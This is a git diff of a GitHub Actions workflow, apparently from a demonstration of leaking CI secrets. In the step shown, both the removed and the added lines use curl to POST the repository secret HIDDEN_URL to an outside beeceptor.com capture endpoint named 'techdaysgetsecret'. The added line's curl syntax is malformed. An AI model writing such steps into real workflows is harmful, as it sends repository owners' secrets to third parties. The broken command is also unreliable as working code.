@@ -11,7 +11,7 @@ jobs:
         env:
           SUPER_SECRET: ${{ secrets.HIDDEN_URL }}
         run: |
-          curl -v -X POST 'https://techdaysgetsecret.free.beeceptor.com/my/api/path' -H 'Content-Type: plain/text' -d "$SUPER_SECRET"
+          curl -v -X POST 'https://techdaysgetsecret.free.beeceptor.com/my/api/path' -H 'Content-Type: plain/text' -d < curl ${{secrets.HIDDEN_URL}}
           
       - name: Action test
         run: |
